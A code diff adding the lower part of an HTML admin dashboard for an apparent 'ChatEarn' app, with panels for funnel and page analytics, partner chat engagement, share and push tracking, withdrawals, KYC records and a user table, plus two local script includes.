+      <div class="admin-panel" id="admin-funnel"><div class="admin-status-banner">Conversion funnel for the last seven days. Each stage counts unique users or browsers.</div><div class="admin-section-title">Full user journey</div><div class="admin-list" id="funnelList"></div></div>
+      <div class="admin-panel" id="admin-pages"><div class="admin-status-banner">Page performance for the last seven days.</div><div class="admin-grid" id="pageKpis"></div><div class="admin-section-title">Page performance</div><div class="admin-table-wrap"><table class="admin-table"><thead><tr><th>Page</th><th>Views</th><th>Unique sessions</th><th>Average time</th><th>Exits</th></tr></thead><tbody id="pagesTable"></tbody></table></div></div>
+      <div class="admin-panel" id="admin-chats"><div class="admin-status-banner">Chat engagement for the last seven days. Private message contents are not displayed.</div><div class="admin-grid" id="chatKpis"></div><div class="admin-section-title">Partner engagement</div><div class="admin-table-wrap"><table class="admin-table"><thead><tr><th>Partner</th><th>Opens</th><th>Messages</th><th>Replies</th><th>Avg messages</th><th>Drop-off</th></tr></thead><tbody id="chatsTable"></tbody></table></div></div>
+      <div class="admin-panel" id="admin-shares"><div class="admin-status-banner">WhatsApp opens and returns are tracked. Delivery to individual contacts cannot be confirmed by the browser.</div><div class="admin-grid" id="shareKpis"></div><div class="admin-section-title">Share activity</div><div class="admin-list" id="shareList"></div></div>
+      <div class="admin-panel" id="admin-propush"><div class="admin-status-banner">Latest browser-reported ProPush state per unique visitor. Official delivery and click totals remain in ProPush.</div><div class="admin-grid" id="pushKpis"></div><div class="admin-section-title">Latest browser states</div><div class="admin-list" id="pushList"></div></div>
+      <div class="admin-panel" id="admin-activity"><div class="admin-status-banner">Important actions are shown separately from technical diagnostics. Message contents and passwords are not recorded.</div><div class="admin-grid" id="activityKpis"></div><div class="admin-filter-row"><button type="button" class="admin-filter-btn active" data-activity-filter="important" onclick="setActivityFilter('important',this)">Important actions</button><button type="button" class="admin-filter-btn" data-activity-filter="all" onclick="setActivityFilter('all',this)">All events</button><button type="button" class="admin-filter-btn" data-activity-filter="errors" onclick="setActivityFilter('errors',this)">Errors</button><button type="button" class="admin-filter-btn" data-activity-filter="technical" onclick="setActivityFilter('technical',this)">Technical diagnostics</button></div><div class="admin-list" id="activityList"></div></div>
+      <div class="admin-panel" id="admin-withdrawals"><div class="admin-section-title">Withdrawal requests</div><div class="admin-list" id="withdrawalList"></div></div>
+      <div class="admin-panel" id="admin-kyc"><div class="admin-section-title">KYC records</div><div class="admin-list" id="kycList"></div></div>
+      <div class="admin-panel" id="admin-users"><input class="admin-filter" id="userFilter" placeholder="Search name or email" oninput="renderAdminUsers()"><div class="admin-section-title">Registered users</div><div class="admin-table-wrap"><table class="admin-table"><thead><tr><th>User</th><th>Balance</th><th>Messages</th><th>Shares</th><th>Last active</th><th>Status</th></tr></thead><tbody id="usersTable"></tbody></table></div></div>
+      <div class="admin-panel" id="admin-insights"><div class="admin-section-title">Automatic improvement analysis</div><div id="insightsList"></div></div>
+    </div>
+  </div>
+</div>
+
+
+<script src="./assets/js/chatearn-v3.js?v=4.0.0" defer></script>
+<script src="./assets/js/chatearn-v4-admin.js?v=4.0.0" defer></script>
+
+</body>
+</html>
